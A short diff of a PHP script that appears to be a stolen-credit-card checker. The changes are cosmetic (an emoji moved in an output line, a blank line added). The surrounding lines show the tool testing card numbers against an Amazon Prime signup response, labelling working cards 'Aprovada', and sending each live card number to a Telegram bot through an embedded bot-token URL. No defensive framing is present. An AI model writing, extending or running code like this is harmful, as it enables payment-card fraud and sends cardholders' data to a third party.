@@ -996,7 +996,7 @@ if (is_numeric($cc) && (strlen($cc) == 16 || strlen($cc) == 15)) {
 deletecard($datajson);
 
 if (strpos($mesgirespfim, 'BILLING_ADDRESS_RESTRICTED') !== false || strpos($mesgirespfim, 'Non è stato possibile completare la tua iscrizione a Prime. Ti consigliamo di riprovare durante il proceso di checkout.') !== false) {
-    echo "Aprovada $lista | Authorised  ✅";
+    echo "Aprovada ✅ $lista | Authorised  ";
     
     // Enviar live aprovada para o bot do Telegram
 $mensagem = urlencode("✅ Live aprovada: $lista"); // substitua pela variável correta
@@ -1024,4 +1024,5 @@ file_get_contents("https://api.telegram.org/bot7748457693:AAHGW30nEHdbGBI6pCZNdQ
 }
 
 ?>
+
 
